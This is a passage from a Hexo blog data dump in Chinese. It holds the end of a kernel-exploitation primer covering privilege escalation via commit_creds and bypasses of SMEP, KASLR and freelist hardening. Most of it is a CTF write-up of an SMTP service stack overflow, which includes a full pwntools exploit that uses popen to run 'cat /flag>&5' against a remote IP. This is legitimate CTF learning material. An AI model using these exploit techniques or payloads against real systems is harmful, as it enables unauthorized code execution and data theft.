<code>slab/slub 分配器</code></li>\n<li>free() -&gt; **kfree()**，同 kmalloc()</li>\n</ul>\n<p>用于改变权限的函数：</p>\n<ul>\n<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是<code>daemon</code>参数应为<strong>有效的进程描述符地址或NULL</strong></li>\n<li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程</li>\n</ul>\n<p>从函数名也可以看出，执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 root 权限，0 表示 以 0 号进程作为参考准备新的 credentials。</p>\n<h2 id=\"内核态保护机制\"><a href=\"#内核态保护机制\" class=\"headerlink\" title=\"内核态保护机制\"></a>内核态保护机制</h2><p>与用户态类似，内核态也有对应的保护机制，canary, dep, PIE, RELRO 等保护与用户态原理和作用相同，除此之外，内核还有特殊的保护机制。</p>\n<h3 id=\"KASLR\"><a href=\"#KASLR\" class=\"headerlink\" title=\"KASLR\"></a>KASLR</h3><p>KASLR即<code>内核空间地址随机化</code>（kernel address space layout randomize），与用户态程序的ASLR相类似，在内核镜像映射到实际的地址空间时加上一个随机的偏移值，但是内核内部的<strong>相对偏移</strong>其实还是不变的</p>\n<h3 id=\"FGKASLR\"><a href=\"#FGKASLR\" class=\"headerlink\" title=\"FGKASLR\"></a>FGKASLR</h3><p>KASLR 虽然在一定程度上能够缓解攻击，但是若是攻击者通过一些信息泄露漏洞获取到内核中的某个地址，仍能够直接得知内核加载地址偏移从而得知整个内核地址布局，这在用户态pwn中也已经见怪不怪了。</p>\n<p>因此有研究者基于 KASLR 实现了 FGKASLR，<strong>以函数粒度重新排布内核代码</strong>，将每个函数单独分段，每个段的偏移随机化，这会大大提高攻击的难度。目前，FGKASLR 只支持 x86_64 架构。</p>\n<h3 id=\"SMEP-SMAP\"><a href=\"#SMEP-SMAP\" class=\"headerlink\" title=\"SMEP/SMAP\"></a>SMEP/SMAP</h3><p>SMEP即<strong>管理模式执行保护</strong>（Supervisor Mode Execution Protection）。当处理器处于 <code>ring0</code> 模式（内核态）时，<strong>执行用户空间的代码</strong>会触发页错误。（在 arm 中该保护称为 <code>PXN</code>）</p>\n<p> SMAP即<strong>管理模式访问保护</strong>（Superivisor Mode Access Protection），类似于 smep，当处理器处于 <code>ring0</code> 模式（内核态）时，<strong>访问用户空间的数据</strong>会触发错误。</p>\n<p>这两种保护通常是同时开启的，用以阻止<strong>内核空间直接访问/执行用户空间的数据</strong>，完全地将内核空间与用户空间相分隔开，用以<strong>防范ret2usr</strong>（return-to-user，将内核空间的指令指针重定向至用户空间上构造好的提权代码）攻击。</p>\n<p>绕过方法：</p>\n<ul>\n<li>利用内核线性映射区对物理地址空间的完整映射，找到用户空间对应页框的内核空间地址，利用该内核地址完成对用户空间的访问（即<strong>一个内核空间地址与一个用户空间地址映射到了同一个页框上</strong>），这种攻击手法称为<code>ret2dir</code></li>\n<li>Intel下系统根据CR4控制寄存器的第20位标识是否开启SMEP保护（1为开启，0为关闭），若是能够通过kernel ROP<strong>改变CR4寄存器的值</strong>便能够关闭SMEP保护，完成SMEP-bypass，接下来就能够重新进行 ret2usr，<strong>但对于开启了 KPTI 的内核而言，内核页表的用户地址空间无执行权限，这使得 ret2usr 彻底成为过去式</strong>。</li>\n</ul>\n<h3 id=\"STACK-PROTECTOR\"><a href=\"#STACK-PROTECTOR\" class=\"headerlink\" title=\"STACK PROTECTOR\"></a>STACK PROTECTOR</h3><p>类似于用户态程序的 canary，通常又被称作是 stack cookie，用以检测<strong>是否发生内核堆栈溢出</strong>，若是发生内核堆栈溢出则会产生 kernel panic</p>\n<p>内核中的 canary 的值通常<strong>取自<code>GS</code>段寄存器某个固定偏移处的值</strong>，可以尝试劫持这个值。</p>\n<h3 id=\"KPTI\"><a href=\"#KPTI\" class=\"headerlink\" title=\"KPTI\"></a>KPTI</h3><p>KPTI即<strong>内核页表隔离</strong>（Kernel page-table isolation），内核空间与用户空间分别使用<strong>两组不同的页表集</strong>，这对于内核的内存管理产生了根本性的变化</p>\n<h3 id=\"Hardened-Usercopy\"><a href=\"#Hardened-Usercopy\" class=\"headerlink\" title=\"Hardened Usercopy\"></a>Hardened Usercopy</h3><p><code>hardened usercopy</code>在用户空间与内核空间之间拷贝数据时进行越界检查，<strong>主要检查拷贝过程中对内核空间中数据的读写是否会越界（包括读写两方面）</strong>。常用于<code>copy_to_user()</code>和<code>copy_form_user()</code>。</p>\n<p>绕过方式：这种保护不适用于内核空间之间的数据拷贝。</p>\n<h3 id=\"Hardened-freelist\"><a href=\"#Hardened-freelist\" class=\"headerlink\" title=\"Hardened freelist\"></a>Hardened freelist</h3><p>在开启这种保护之前，<code>slub</code> 中的 <code>free object</code> 的 <code>next</code> 指针直接存放着 <code>next free object</code> 的地址，攻击者可以通过读取 <code>freelist</code> 泄露出内核线性映射区的地址。</p>\n<p>在开启了该保护之后 <code>free object</code> 的 <code>next</code> 指针存放的是由以下三个值进行<strong>异或</strong>操作后的值：</p>\n<ul>\n<li>当前 <code>free object</code> 的地址</li>\n<li>下一个 <code>free object</code> 的地址</li>\n<li>由 <code>kmem_cache</code> 指定的一个 random 值</li>\n</ul>\n<p>这使得攻击者必须要获取第一和第三个值才能修改<code>free list</code></p>\n<h3 id=\"Random-freelist\"><a href=\"#Random-freelist\" class=\"headerlink\" title=\"Random freelist\"></a>Random freelist</h3><p>这种保护主要发生在 slub allocator 向 buddy system 申请到页框之后的处理过程中，对于未开启这种保护的一张完整的 slub，其上的 object 的连接顺序是<strong>线性连续</strong>的，但在开启了这种保护之后其上的 object 之间的连接顺序是<strong>随机</strong>的，这让攻击者<strong>无法直接预测</strong>下一个分配的 object 的地址</p>\n<p>需要注意的是这种保护发生在<strong>slub allocator 刚从 buddy system 拿到新 slub 的时候，运行时 freelist 的构成仍遵循 LIFO</strong></p>\n<h3 id=\"CONFIG-INIT-ON-ALLOC-DEFAULT-ON\"><a href=\"#CONFIG-INIT-ON-ALLOC-DEFAULT-ON\" class=\"headerlink\" title=\"CONFIG_INIT_ON_ALLOC_DEFAULT_ON\"></a>CONFIG_INIT_ON_ALLOC_DEFAULT_ON</h3><p>当编译内核时开启了这个选项时，在内核进行“堆内存”分配时（包括 buddy system 和 slab allocator），<strong>会将被分配的内存上的内容进行清零</strong>，从而防止了利用未初始化内存进行数据泄露的情况</p>\n<h2 id=\"kernel-pwn相关文件\"><a href=\"#kernel-pwn相关文件\" class=\"headerlink\" title=\"kernel pwn相关文件\"></a>kernel pwn相关文件</h2><p>kernel pwn的题目一般会给以下三个文件：</p>\n<ol>\n<li>boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关</li>\n<li>bzImage: kernel binary</li>\n<li>rootfs.cpio: 文件系统映像</li>\n</ol>\n<p>qemu部分参数说明如下：</p>\n<ul>\n<li><p><code>-m</code>：虚拟机内存大小</p>\n</li>\n<li><p><code>-kernel</code>：内存镜像路径(bzimage)</p>\n</li>\n<li><p><code>-initrd</code>：磁盘镜像路径(rootfs.cpio)</p>\n</li>\n<li><p><code>-append</code>：附加参数选项</p>\n<ul>\n<li><code>nokalsr</code>：关闭内核地址随机化，方便我们进行调试</li>\n<li><code>rdinit</code>：指定初始启动进程，<code>/sbin/init</code>进程会默认以 <code>/etc/init.d/rcS</code> 作为启动脚本</li>\n<li><code>loglevel=3 </code>&amp; <code>quiet</code>：不输出log</li>\n<li><code>console=ttyS0</code>：指定终端为<code>/dev/ttyS0</code>，这样一启动就能进入终端界面</li>\n</ul>\n</li>\n<li><p><code>-monitor</code>：将监视器重定向到主机设备<code>/dev/null</code>，这里重定向至null主要是防止CTF中被人给偷了qemu拿flag，遇到没有这一行的可以直接通过<code>ctrl a + c</code>进入<code>qemu</code>的<code>monitor</code>模式，之后通过<code>migrate &quot;exec: cat rootfs.cpio 1&gt;&amp;2&quot;</code>查看<code>rootfs.cpio</code>文件，在其中找<code>flag</code>。</p>\n</li>\n<li><p><code>-cpu</code>：设置CPU安全选项（如smep保护）</p>\n</li>\n<li><p><code>-s</code>：相当于<code>-gdb tcp::1234</code>的简写（也可以直接这么写），后续我们可以通过gdb连接本地端口进行调试</p>\n</li>\n</ul>"},{"title":"MTCTF-smtp","date":"2023-03-21T11:15:16.000Z","_content":"\nmtctf2022，一道协议题，这种题大多难在逆向，漏洞本身没什么难度。\n\n<!-- more -->\n\n32位的，就开了NX。\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/OwnStudy/smtp/docker/bin/pwn'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n### 逆向\n\nmain函数起了一个listener，默认端口是9999。\n\n```c\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)\n{\n  if ( argc == 2 )\n    listener((char *)argv[1]);\n  listener(\"9999\");\n}\n```\n\n跟进去看一下：\n\n里面有很多和网络编程有关的结构：\n\n解析hostname的addrinfo结构，以及\n\n```c\n#include<netdb.h>\nstruct addrinfo {\n    int ai_flags;   /* AI_PASSIVE, AI_CANONNAME, AI_NUMERICHOST */\n    int ai_family;  /* PF_xxx */\n    int ai_socktype;    /* SOCK_xxx */\n    int ai_protocol;    /* 0 or IPPROTO_xxx for IPv4 and IPv6 */\n    socklen_t ai_addrlen;   /* length of ai_addr */\n    char    *ai_canonname;  /* canonical name for hostname */\n    struct  sockaddr *ai_addr;  /* binary address */\n    struct  addrinfo *ai_next;  /* next structure in linked list */\n};\n\n// 通过hostname、service和hints限定域名、服务/端口、期望的addrinfo来返回addrinfo结构链表（result）\nint getaddrinfo( const char *hostname, const char *service, const struct addrinfo *hints, struct addrinfo **result );\ngetaddrinfo(0, service, &s, &pai);\n\n// 之后通过这个链表来创建socket\nfd = socket(pai->ai_family, pai->ai_socktype, pai->ai_protocol);\n```\n\n之后设置socket的选项，绑定本地地址，并在该socket上监听。\n\n之后使用epoll进行事件触发：\n\n```c\ntypedef union epoll_data {\n    void *ptr;\n    int fd;\n    __uint32_t u32;\n    __uint64_t u64;\n} epoll_data_t;\n \nstruct epoll_event {\n    __uint32_t events; /* Epoll events */\n    epoll_data_t data; /* User data variable */\n};\n\n// 创建一个epoll的句柄，size用来告诉内核这个监听的数目的大致数目，而不是能够处理的事件的最大个数。\nint epoll_create(int size);\n\n// epoll的事件注册函数，epoll_ctl向 epoll对象中添加、修改或者删除感兴趣的事件，返回0表示成功，否则返回–1，此时需要根据errno错误码判断错误类型。\nint epoll_ctl(int epfd, int op, int fd, struct epoll_event *event);\n\n// 等待事件的产生。参数events用来从内核得到事件的集合，maxevents告之内核这个events有多大，这个 maxevents的值不能大于创建epoll_create()时的size，参数timeout是超时时间（毫秒，0会立即返回，-1将不确定，也有说法说是永久阻塞）。该函数返回需要处理的事件数目，如返回0表示已超时。如果返回–1，则表示出现错误，需要检查 errno错误码判断错误类型。\nint epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);\n```\n\n等待连接，监听到连接后便开启一个新线程`session_worker`对连接进行处理，接收参数`arg`：\n\n```c\n//返回值：成功：fileno 出错：-1\nint accept(int sockfd,struct sockaddr * addr,socklen_t* addrlen);\n\nv11 = accept(fd, &addr, &addr_len);\narg = malloc(0x14u);\n*(_DWORD *)arg = v11;\n*((_DWORD *)arg + 1) = 0;\npthread_create(&newthread, 0, (void *(*)(void *))session_worker, arg);\nputs(\"listener: initiated a new session worker\");\n```\n\n进`session_worker`看看：\n\n首先会保存旧的arg并对其进行reset，arg结构大概如下：\n\n```c\nstruct session_arg{\n    int fd=old_arg.fd;\n    int State=0;\n    int Mail=-1;\n    int Recp=0;\n    struct session_data* Data;\n}\nstruct session_data{\n    dd data_from=0;\n    dd data_to=0;\n   \tdd recv_msg=0;\n}\n```\n\n`reset`后会显示连接成功，注册事件并继续等待，申请一个0x400的`request`接收请求。\n\n在`parse_request`中对`request`进行解析，会返回一个`DWORD[2]`的任务编码`cmd_code`：\n\n```c\nstruct cmd{\n    int code;\n    dd argument;\n}\n\ncode=-1 argument=0:识别错误\ncode=0 argument=argument_string_start:开头为HELO\ncode=1 argument=argument_string_start:开头为MAIL FROM:\ncode=2 argument=argument_string_start:开头为RCPT TO:\ncode=3 argument=argument_string_start:开头为DATA\ncode=4 argument=argument_string_start:开头为.\\r\\n或以\\r\\n.\\r\\n结尾\ncode=5 argument=argument_string_start:开头为QUIT\nargument_string_start可以为null\n```\n\n在这之后，如果满足`old_arg->State == 4 || *(_DWORD *)cmd_code == 4`就会走下面的程序流：\n\n如果满足`old_arg->State == 4 && *(_DWORD *)cmd_code == 4 && strlen((const char *)request) > 3`，那么就会将`recv_msg`和`request`连接在一起放入`recv_msg`。\n\n否则会在`old_data`中保存`session_data`并将`request`存在`recv_msg`中。\n\n之后就会按照`cmd_code`进行不同的操作：\n\n```c\n// 均对old_arg操作(初始State=0)\ncode=-1:syntax error\ncode=0:reset(old_arg)，设置State=1并执行Recp=argument\ncode=1:需要State==1，设置State=2并执行Data->data_from=argument\ncode=2:需要State==2 or ==3，设置State=3并执行Data->data_to=argument\ncode=3:需要State!=3，设置State=4\ncode=4:需要State==4，创建一个新线程sender_worker提交Data，reset(old_arg)，设置State=1\ncode=5:需要State==5，设置State=5，会结束这次session\n```\n\n否则，也就是`old_arg->State == 4 || *(_DWORD *)cmd_code == 4`不满足：\n\n如果`recv_msg`中有内容，那么就会将`recv_msg`和`request`连接在一起放入`recv_msg`，否则直接将`request`放入`recv_msg`\n\n再深入看看`sender_worker`：\n\n输出`data_from`，若其长度<= 0x4F则copy到`bss段中的from`处\n\n输出`data_to`，若其长度>0xFF(255)则copy到s处，存在**栈溢出**。\n\n```c\nchar s[256]; // [esp+Ch] [ebp-10Ch] BYREF  \nif ( len <= 0xFFu )\n  {\n    printf(\"sender: TO: %s\\n\", v3->data_to);\n  }\nelse\n  {\n    memset(s, 0, sizeof(s));\n    strcpy(s, (const char *)v3->data_to);       // 栈溢出\n    printf(\"sender: TO: %s\\n\", s);\n  }\n```\n\n最后输出`recv_msg`。\n\n### 利用\n\n在`sender_worker`中存在栈溢出，若`data_to`长度>0xFF(255)则copy到s(ebp-0x10c)处，存在**栈溢出**。若`data_from`长度<= 0x4F则copy到`bss段中的from`处。\n\n由于每次都会创建一个新的`sender_worker`线程完成工作，因此难以采取ret2libc。但`data_from`保存在`bss`段中，可以试试往里面写入shellcode（虽然这里是RW，但还是试试吧），通过栈溢出劫持程序到此处运行shellcode。\n\n尝试的时候遇到了个问题，程序会卡在一个地方。\n\n```sh\n   # eax=0x61616161\n   0x8049ac5 <sender_worker+295>    add    esp, 0x10\n   0x8049ac8 <sender_worker+298>    mov    eax, dword ptr [ebp - 0xc]\n ► 0x8049acb <sender_worker+301>    mov    eax, dword ptr [eax + 8] # 会卡在这里\n   0x8049ace <sender_worker+304>    test   eax, eax\n   0x8049ad0 <sender_worker+306> \n```\n\n估计是因为变量v3被覆盖，找不到`recv_msg`了，需要找一个地址`addr`，并且`addr+0x8`可以访问。\n\n最后虽然跳转到覆盖的返回地址，但果然bss段里面的shellcode无法执行。\n\n据说`popen()`函数可以执行`sh`指令，尝试一下。\n\n```c\nFILE * popen( const char * command,const char * type);\n\n//popen()会调用fork()产生子进程，然后从子进程中调用/bin/sh -c来执行参数command的指令。参数type可使用“r”代表读取，“w”代表写入。依照此type值，popen()会建立管道连到子进程的标准输出设备或标准输入设备，然后返回一个文件指针。随后进程便可利用此文件指针来读取子进程的输出设备或是写入到子进程的标准输入设备中。此外，所有使用文件指针(FILE*)操作的函数也都可以使用，除了fclose()以外。\n\n//如果 type 为 r，那么调用进程读进 command 的标准输出。\n//如果 type 为 w，那么调用进程写到 command 的标准输入。\n```\n\n执行`sh`好像没有用，虽然运行了`/bin/dash`，但输出过去的信息不会产生作用，不知道是不是因为没有send回来。\n\n后面换了`cat /flag>&5`，在本地起的可以返回`flag`。\n\n但远程的不行，可能是因为本地用的`fd`刚好是5，但远程的不是。\n\n爆破远程的`fd`到1030都不行，可能是因为其他原因吧，docker的和远程一样都不行。\n\nexp:\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='i386')\nfilename='pwn'\nelf=ELF('./'+filename)\nlibc=ELF('./libc.so.6')\n# p=process('./'+filename)\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\n# p=remote('localhost',9999)\np=remote('43.142.108.3',28972)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \ndef Hello():\n    r()\n    sl(\"HELO\")\n\n\ndef Mail_from(content):\n    r()\n    sl(b'MAIL FROM:'+content)\n\ndef Rcpt_to(content):\n    r()\n    sl(b'RCPT TO:'+content)\n\ndef Data():\n    r()\n    sl(b'DATA')\n\n\ndef Sender():\n    r()\n    sl('.\\r\\n')\n\na_str=0x0804B141\nfrom_addr=0x0804d140\nHello()\npayload=b\"cat /flag>&5\"\nMail_from(payload)\npayload=b'a'*0x100+p32(from_addr+0x40)+b'a'*0xc+p32(elf.plt['popen'])+p32(0xdeadbeef)+p32(from_addr)+p32(elf.search(b\"r\\x00\").__next__())\nRcpt_to(payload)\nData()\nSender()\nru(\"250 Ok\\n\")\nflag=ru(\"\\n\")\nleak(\"flag\",flag)\nitr()\n```\n\n\n\n","source":"_posts/MTCTF-smtp.md","raw":"---\ntitle: MTCTF-smtp\ndate: 2023-03-21 19:15:16\ncategories: \n- pwn_wp\ntags: \n- pwn\n- protocol\n\n---\n\nmtctf2022，一道协议题，这种题大多难在逆向，漏洞本身没什么难度。\n\n<!-- more -->\n\n32位的，就开了NX。\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/OwnStudy/smtp/docker/bin/pwn'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n### 逆向\n\nmain函数起了一个listener，默认端口是9999。\n\n```c\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)\n{\n  if ( argc == 2 )\n    listener((char *)argv[1]);\n  listener(\"9999\");\n}\n```\n\n跟进去看一下：\n\n里面有很多和网络编程有关的结构：\n\n解析hostname的addrinfo结构，以及\n\n```c\n#include<netdb.h>\nstruct addrinfo {\n    int ai_flags;   /* AI_PASSIVE, AI_CANONNAME, AI_NUMERICHOST */\n    int ai_family;  /* PF_xxx */\n    int ai_socktype;    /* SOCK_xxx */\n    int ai_protocol;    /* 0 or IPPROTO_xxx for IPv4 and IPv6 */\n    socklen_t ai_addrlen;   /* length of ai_addr */\n    char    *ai_canonname;  /* canonical name for hostname */\n    struct  sockaddr *ai_addr;  /* binary address */\n    struct  addrinfo *ai_next;  /* next structure in linked list */\n};\n\n// 通过hostname、service和hints限定域名、服务/端口、期望的addrinfo来返回addrinfo结构链表（result）\nint getaddrinfo( const char *hostname, const char *service, const struct addrinfo *hints, struct addrinfo **result );\ngetaddrinfo(0, service, &s, &pai);\n\n// 之后通过这个链表来创建socket\nfd = socket(pai->ai_family, pai->ai_socktype, pai->ai_protocol);\n```\n\n之后设置socket的选项，绑定本地地址，并在该socket上监听。\n\n之后使用epoll进行事件触发：\n\n```c\ntypedef union epoll_data {\n    void *ptr;\n    int fd;\n    __uint32_t u32;\n    __uint64_t u64;\n} epoll_data_t;\n \nstruct epoll_event {\n    __uint32_t events; /* Epoll events */\n    epoll_data_t data; /* User data variable */\n};\n\n// 创建一个epoll的句柄，size用来告诉内核这个监听的数目的大致数目，而不是能够处理的事件的最大个数。\nint epoll_create(int size);\n\n// epoll的事件注册函数，epoll_ctl向 epoll对象中添加、修改或者删除感兴趣的事件，返回0表示成功，否则返回–1，此时需要根据errno错误码判断错误类型。\nint epoll_ctl(int epfd, int op, int fd, struct epoll_event *event);\n\n// 等待事件的产生。参数events用来从内核得到事件的集合，maxevents告之内核这个events有多大，这个 maxevents的值不能大于创建epoll_create()时的size，参数timeout是超时时间（毫秒，0会立即返回，-1将不确定，也有说法说是永久阻塞）。该函数返回需要处理的事件数目，如返回0表示已超时。如果返回–1，则表示出现错误，需要检查 errno错误码判断错误类型。\nint epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);\n```\n\n等待连接，监听到连接后便开启一个新线程`session_worker`对连接进行处理，接收参数`arg`：\n\n```c\n//返回值：成功：fileno 出错：-1\nint accept(int sockfd,struct sockaddr * addr,socklen_t* addrlen);\n\nv11 = accept(fd, &addr, &addr_len);\narg = malloc(0x14u);\n*(_DWORD *)arg = v11;\n*((_DWORD *)arg + 1) = 0;\npthread_create(&newthread, 0, (void *(*)(void *))session_worker, arg);\nputs(\"listener: initiated a new session worker\");\n```\n\n进`session_worker`看看：\n\n首先会保存旧的arg并对其进行reset，arg结构大概如下：\n\n```c\nstruct session_arg{\n    int fd=old_arg.fd;\n    int State=0;\n    int Mail=-1;\n    int Recp=0;\n    struct session_data* Data;\n}\nstruct session_data{\n    dd data_from=0;\n    dd data_to=0;\n   \tdd recv_msg=0;\n}\n```\n\n`reset`后会显示连接成功，注册事件并继续等待，申请一个0x400的`request`接收请求。\n\n在`parse_request`中对`request`进行解析，会返回一个`DWORD[2]`的任务编码`cmd_code`：\n\n```c\nstruct cmd{\n    int code;\n    dd argument;\n}\n\ncode=-1 argument=0:识别错误\ncode=0 argument=argument_string_start:开头为HELO\ncode=1 argument=argument_string_start:开头为MAIL FROM:\ncode=2 argument=argument_string_start:开头为RCPT TO:\ncode=3 argument=argument_string_start:开头为DATA\ncode=4 argument=argument_string_start:开头为.\\r\\n或以\\r\\n.\\r\\n结尾\ncode=5 argument=argument_string_start:开头为QUIT\nargument_string_start可以为null\n```\n\n在这之后，如果满足`old_arg->State == 4 || *(_DWORD *)cmd_code == 4`就会走下面的程序流：\n\n如果满足`old_arg->State == 4 && *(_DWORD *)cmd_code == 4 && strlen((const char *)request) > 3`，那么就会将`recv_msg`和`request`连接在一起放入`recv_msg`。\n\n否则会在`old_data`中保存`session_data`并将`request`存在`recv_msg`中。\n\n之后就会按照`cmd_code`进行不同的操作：\n\n```c\n// 均对old_arg操作(初始State=0)\ncode=-1:syntax error\ncode=0:reset(old_arg)，设置State=1并执行Recp=argument\ncode=1:需要State==1，设置State=2并执行Data->data_from=argument\ncode=2:需要State==2 or ==3，设置State=3并执行Data->data_to=argument\ncode=3:需要State!=3，设置State=4\ncode=4:需要State==4，创建一个新线程sender_worker提交Data，reset(old_arg)，设置State=1\ncode=5:需要State==5，设置State=5，会结束这次session\n```\n\n否则，也就是`old_arg->State == 4 || *(_DWORD *)cmd_code == 4`不满足：\n\n如果`recv_msg`中有内容，那么就会将`recv_msg`和`request`连接在一起放入`recv_msg`，否则直接将`request`放入`recv_msg`\n\n再深入看看`sender_worker`：\n\n输出`data_from`，若其长度<= 0x4F则copy到`bss段中的from`处\n\n输出`data_to`，若其长度>0xFF(255)则copy到s处，存在**栈溢出**。\n\n```c\nchar s[256]; // [esp+Ch] [ebp-10Ch] BYREF  \nif ( len <= 0xFFu )\n  {\n    printf(\"sender: TO: %s\\n\", v3->data_to);\n  }\nelse\n  {\n    memset(s, 0, sizeof(s));\n    strcpy(s, (const char *)v3->data_to);       // 栈溢出\n    printf(\"sender: TO: %s\\n\", s);\n  }\n```\n\n最后输出`recv_msg`。\n\n### 利用\n\n在`sender_worker`中存在栈溢出，若`data_to`长度>0xFF(255)则copy到s(ebp-0x10c)处，存在**栈溢出**。若`data_from`长度<= 0x4F则copy到`bss段中的from`处。\n\n由于每次都会创建一个新的`sender_worker`线程完成工作，因此难以采取ret2libc。但`data_from`保存在`bss`段中，可以试试往里面写入shellcode（虽然这里是RW，但还是试试吧），通过栈溢出劫持程序到此处运行shellcode。\n\n尝试的时候遇到了个问题，程序会卡在一个地方。\n\n```sh\n   # eax=0x61616161\n   0x8049ac5 <sender_worker+295>    add    esp, 0x10\n   0x8049ac8 <sender_worker+298>    mov    eax, dword ptr [ebp - 0xc]\n ► 0x8049acb <sender_worker+301>    mov    eax, dword ptr [eax + 8] # 会卡在这里\n   0x8049ace <sender_worker+304>    test   eax, eax\n   0x8049ad0 <sender_worker+306> \n```\n\n估计是因为变量v3被覆盖，找不到`recv_msg`了，需要找一个地址`addr`，并且`addr+0x8`可以访问。\n\n最后虽然跳转到覆盖的返回地址，但果然bss段里面的shellcode无法执行。\n\n据说`popen()`函数可以执行`sh`指令，尝试一下。\n\n```c\nFILE * popen( const char * command,const char * type);\n\n//popen()会调用fork()产生子进程，然后从子进程中调用/bin/sh -c来执行参数command的指令。参数type可使用“r”代表读取，“w”代表写入。依照此type值，popen()会建立管道连到子进程的标准输出设备或标准输入设备，然后返回一个文件指针。随后进程便可利用此文件指针来读取子进程的输出设备或是写入到子进程的标准输入设备中。此外，所有使用文件指针(FILE*)操作的函数也都可以使用，除了fclose()以外。\n\n//如果 type 为 r，那么调用进程读进 command 的标准输出。\n//如果 type 为 w，那么调用进程写到 command 的标准输入。\n```\n\n执行`sh`好像没有用，虽然运行了`/bin/dash`，但输出过去的信息不会产生作用，不知道是不是因为没有send回来。\n\n后面换了`cat /flag>&5`，在本地起的可以返回`flag`。\n\n但远程的不行，可能是因为本地用的`fd`刚好是5，但远程的不是。\n\n爆破远程的`fd`到1030都不行，可能是因为其他原因吧，docker的和远程一样都不行。\n\nexp:\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='i386')\nfilename='pwn'\nelf=ELF('./'+filename)\nlibc=ELF('./libc.so.6')\n# p=process('./'+filename)\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\n# p=remote('localhost',9999)\np=remote('43.142.108.3',28972)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \ndef Hello():\n    r()\n    sl(\"HELO\")\n\n\ndef Mail_from(content):\n    r()\n    sl(b'MAIL FROM:'+content)\n\ndef Rcpt_to(content):\n    r()\n    sl(b'RCPT TO:'+content)\n\ndef Data():\n    r()\n    sl(b'DATA')\n\n\ndef Sender():\n    r()\n    sl('.\\r\\n')\n\na_str=0x0804B141\nfrom_addr=0x0804d140\nHello()\npayload=b\"cat /flag>&5\"\nMail_from(payload)\npayload=b'a'*0x100+p32(from_addr+0x40)+b'a'*0xc+p32(elf.plt['popen'])+p32(0xdeadbeef)+p32(from_addr)+p32(elf.search(b\"r\\x00\").__next__())\nRcpt_to(payload)\nData()\nSender()\nru(\"250 Ok\\n\")\nflag=ru(\"\\n\")\nleak(\"flag\",flag)\nitr()\n```\n\n\n\n","slug":"MTCTF-smtp","published":1,"updated":"2023-03-22T11:54:14.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafb00145oud8zk4hxhs","content":"<p>mtctf2022，一道协议题，这种题大多难在逆向，漏洞本身没什么难度。</p>\n<span id=\"more\"></span>\n\n<p>32位的，就开了NX。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/OwnStudy/smtp/docker/bin/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h3><p>main函数起了一个listener，默认端口是9999。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl __noreturn <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( argc == <span class=\"number\">2</span> )</span><br><span class=\"line\">    listener((<span class=\"type\">char</span> *)argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  listener(<span class=\"string\">&quot;9999&quot;</span>);</span><br><span 